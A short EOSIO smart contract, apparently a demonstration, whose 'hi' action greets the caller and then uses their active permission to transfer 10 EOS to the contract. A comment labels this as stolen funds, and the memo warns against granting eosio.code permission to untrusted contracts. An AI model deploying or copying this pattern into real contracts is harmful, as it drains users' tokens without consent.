/**
 *  @badeosiocode
 */

#include "badeosiocode.hpp"

namespace hashdapp {

    void badeosiocode::hi( account_name user )
    {
        require_auth(user);

        print( "Hello, ", name{user} );

        action(
                permission_level{ user, N(active) },
                N(eosio.token), N(transfer),
                std::make_tuple(user, _self,
                asset(100000, S(4, EOS)),// 10 EOS get stolen
                std::string("DO NOT SET eosio.code permission TO UNTRUSTED CONTRACTs"))
            ).send();
      }
}


EOSIO_ABI( hashdapp::badeosiocode, (hi) )

